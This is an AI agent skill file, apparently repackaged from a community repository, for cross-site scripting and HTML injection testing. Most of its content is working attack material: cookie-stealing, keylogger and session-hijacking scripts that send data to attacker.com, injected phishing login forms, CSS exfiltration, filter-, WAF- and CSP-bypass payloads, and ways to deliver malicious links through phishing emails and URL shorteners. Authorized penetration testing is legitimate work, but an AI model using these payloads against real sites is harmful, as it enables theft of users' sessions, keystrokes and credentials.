---
name: xss-html-injection
description: "Cross-Site Scripting and HTML Injection Testing workflow skill. Use this skill when the user needs Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms and the operator should preserve the upstream workflow, copied support files, and provenance before merging or handing off."
version: "0.0.1"
category: frontend
tags: ["xss-html-injection", "execute", "comprehensive", "client-side", "injection", "vulnerability", "assessments", "web"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-15"
date_updated: "2026-04-19"
---

# Cross-Site Scripting and HTML Injection Testing

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills-claude/skills/xss-html-injection` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

This intake keeps the copied upstream files intact and uses `EXTERNAL_SOURCE.json` plus `ORIGIN.md` as the provenance anchor for review.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # Cross-Site Scripting and HTML Injection Testing

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Inputs / Prerequisites, Outputs / Deliverables.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and....
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when copied upstream references, examples, or scripts materially improve the answer.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `EXTERNAL_SOURCE.json` | Confirms repository, branch, commit, and imported path before touching the copied workflow |
| Provenance review | `ORIGIN.md` | Gives reviewers a plain-language audit trail for the imported source |
| Workflow execution | `SKILL.md` | Starts with the smallest copied file that materially changes execution |
| Supporting context | `SKILL.md` | Adds the next most relevant copied source file without loading the entire package |
| Handoff decision | `## Related Skills` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. Search boxes and query parameters
2. User profile fields (name, bio, comments)
3. URL fragments and hash values
4. Error messages displaying user input
5. Form fields with client-side validation only
6. Hidden form fields and parameters
7. HTTP headers (User-Agent, Referer)

### Imported Workflow Notes

#### Imported: Core Workflow

### Phase 1: Vulnerability Detection

#### Identify Input Reflection Points
Locate areas where user input is reflected in responses:

```
# Common injection vectors
- Search boxes and query parameters
- User profile fields (name, bio, comments)
- URL fragments and hash values
- Error messages displaying user input
- Form fields with client-side validation only
- Hidden form fields and parameters
- HTTP headers (User-Agent, Referer)
```

#### Basic Detection Testing
Insert test strings to observe application behavior:

```html
<!-- Basic reflection test -->
<test123>

<!-- Script tag test -->
<script>alert('XSS')</script>

<!-- Event handler test -->
<img src=x onerror=alert('XSS')>

<!-- SVG-based test -->
<svg onload=alert('XSS')>

<!-- Body event test -->
<body onload=alert('XSS')>
```

Monitor for:
- Raw HTML reflection without encoding
- Partial encoding (some characters escaped)
- JavaScript execution in browser console
- DOM modifications visible in inspector

#### Determine XSS Type

**Stored XSS Indicators:**
- Input persists after page refresh
- Other users see injected content
- Content stored in database/filesystem

**Reflected XSS Indicators:**
- Input appears only in current response
- Requires victim to click crafted URL
- No persistence across sessions

**DOM-Based XSS Indicators:**
- Input processed by client-side JavaScript
- Server response doesn't contain payload
- Exploitation occurs entirely in browser

### Phase 2: Stored XSS Exploitation

#### Identify Storage Locations
Target areas with persistent user content:

```
- Comment sections and forums
- User profile fields (display name, bio, location)
- Product reviews and ratings
- Private messages and chat systems
- File upload metadata (filename, description)
- Configuration settings and preferences
```

#### Craft Persistent Payloads

```html
<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- Phishing form injection -->
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### Phase 3: Reflected XSS Exploitation

#### Construct Malicious URLs
Build URLs containing XSS payloads:

```
# Basic reflected payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL-encoded payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Event handler in parameter
https://target.com/page?name="><img src=x onerror=alert(1)>

# Fragment-based (for DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Delivery Methods
Techniques for delivering reflected XSS to victims:

```
1. Phishing emails with crafted links
2. Social media message distribution
3. URL shorteners to obscure payload
4. QR codes encoding malicious URLs
5. Redirect chains through trusted domains
```

### Phase 4: DOM-Based XSS Exploitation

#### Identify Vulnerable Sinks
Locate JavaScript functions that process user input:

```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### Identify Sources
Locate where user-controlled data enters the application:

```javascript
// User-controllable sources
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### DOM XSS Payloads

```javascript
// Hash-based injection
https://target.com/page#<img src=x onerror=alert(1)>

// URL parameter injection (processed client-side)
https://target.com/page?default=<script>alert(1)</script>

// PostMessage exploitation
// On attacker page:
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### Phase 5: HTML Injection Techniques

#### Reflected HTML Injection
Modify page appearance without JavaScript:

```html
<!-- Content injection -->
<h1>SITE HACKED</h1>

<!-- Form hijacking -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe injection -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### Stored HTML Injection
Persistent content manipulation:

```html
<!-- Marquee disruption -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- Style override -->
<style>body{background:red !important;}</style>

<!-- Hidden content with CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```

### Phase 6: Filter Bypass Techniques

#### Tag and Attribute Variations

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Malformed tags -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Encoding Bypass

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode encoding -->
<script>\u0061lert(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript Obfuscation

```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script>

// Template literals
<script>alert`1`</script>

// Constructor execution
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script>

// Without parentheses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Whitespace and Comment Bypass

```html
<!-- Tab/newline insertion -->
<img src=x	onerror
=alert(1)>

<!-- JavaScript comments -->
<script>/**/alert(1)/**/</script>

<!-- HTML comments in attributes -->
<img src=x onerror="alert(1)"<!--comment-->
```

#### Imported: Purpose

Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @xss-html-injection to handle <task>. Start from the copied upstream workflow, load only the files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Ask for a provenance-grounded review

```text
Review @xss-html-injection against EXTERNAL_SOURCE.json and ORIGIN.md, then explain which copied upstream files you would load first and why.
```

**Explanation:** Use this before review or troubleshooting when you need a precise, auditable explanation of origin and file selection.

### Example 3: Narrow the copied support files before execution

```text
Use @xss-html-injection for <task>. Load only the copied references, examples, or scripts that change the outcome, and name the files explicitly before proceeding.
```

**Explanation:** This keeps the skill aligned with progressive disclosure instead of loading the whole copied package by default.

### Example 4: Build a reviewer packet

```text
Review @xss-html-injection using the copied upstream files plus provenance, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.

### Imported Usage Notes

#### Imported: Examples

### Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.

### Example 2: Reflected XSS via Search Parameter

**Scenario**: Search results page reflects query without encoding

**Vulnerable URL**:
```
https://shop.example.com/search?q=test
```

**Detection Test**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**Crafted Attack URL**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Delivery**: URL sent via phishing email to target user.

### Example 3: DOM-Based XSS via Hash Fragment

**Scenario**: JavaScript reads URL hash and inserts into DOM

**Vulnerable Code**:
```javascript
document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
```

**Attack URL**:
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**Result**: Script executes entirely client-side; payload never touches server.

### Example 4: CSP Bypass via JSONP Endpoint

**Scenario**: Site has CSP but allows trusted CDN

**CSP Header**:
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Bypass**: Find JSONP endpoint on trusted domain:
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**Result**: CSP bypassed using allowed script source.

## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The goal is to keep provenance explicit and load only the copied source material that materially improves execution.

- Never inject payloads that could damage production systems
- Limit cookie/session capture to demonstration purposes only
- Avoid payloads that could spread to unintended users (worm behavior)
- Do not exfiltrate real user data beyond scope requirements
- Content Security Policy (CSP) may block inline scripts
- HttpOnly cookies prevent JavaScript access
- SameSite cookie attributes limit cross-origin attacks

### Imported Operating Notes

#### Imported: Constraints and Guardrails

### Operational Boundaries
- Never inject payloads that could damage production systems
- Limit cookie/session capture to demonstration purposes only
- Avoid payloads that could spread to unintended users (worm behavior)
- Do not exfiltrate real user data beyond scope requirements

### Technical Limitations
- Content Security Policy (CSP) may block inline scripts
- HttpOnly cookies prevent JavaScript access
- SameSite cookie attributes limit cross-origin attacks
- Modern frameworks often auto-escape outputs

### Legal and Ethical Requirements
- Written authorization required before testing
- Report critical XSS vulnerabilities immediately
- Handle captured credentials per data protection agreements
- Do not use discovered vulnerabilities for unauthorized access

## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/xss-html-injection`, fails to mention provenance, or does not use any copied source files at all.
**Solution:** Re-open `EXTERNAL_SOURCE.json`, `ORIGIN.md`, and the most relevant copied upstream files. Load only the files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Point at the exact copied references, examples, scripts, or assets that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |

## Related Skills

- `@00-andruia-consultant-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@10-andruia-skill-smith-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@20-andruia-niche-intelligence-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@3d-web-experience-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operator packet for this imported skill. They should reflect real copied source material, not generic scaffolding.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | copied reference notes, guides, or background material from upstream | `references/n/a` |
| `examples` | worked examples or reusable prompts copied from upstream | `examples/n/a` |
| `scripts` | upstream helper scripts that change execution or validation | `scripts/n/a` |
| `agents` | routing or delegation notes that are genuinely part of the imported package | `agents/n/a` |
| `assets` | supporting assets or schemas copied from the source package | `assets/n/a` |



### Imported Reference Notes

#### Imported: Quick Reference

### XSS Detection Checklist
```
1. Insert <script>alert(1)</script> → Check execution
2. Insert <img src=x onerror=alert(1)> → Check event handler
3. Insert "><script>alert(1)</script> → Test attribute escape
4. Insert javascript:alert(1) → Test href/src attributes
5. Check URL hash handling → DOM XSS potential
```

### Common XSS Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Cookie Theft Payload
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Session Hijacking Template
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

#### Imported: Inputs / Prerequisites

### Required Access
- Target web application URL with user input fields
- Burp Suite or browser developer tools for request analysis
- Access to create test accounts for stored XSS testing
- Browser with JavaScript console enabled

### Technical Requirements
- Understanding of JavaScript execution in browser context
- Knowledge of HTML DOM structure and manipulation
- Familiarity with HTTP request/response headers
- Understanding of cookie attributes and session management

### Legal Prerequisites
- Written authorization for security testing
- Defined scope including target domains and features
- Agreement on handling of any captured session data
- Incident response procedures established

#### Imported: Outputs / Deliverables

- XSS/HTMLi vulnerability report with severity classifications
- Proof-of-concept payloads demonstrating impact
- Session hijacking demonstrations (controlled environment)
- Remediation recommendations with CSP configurations
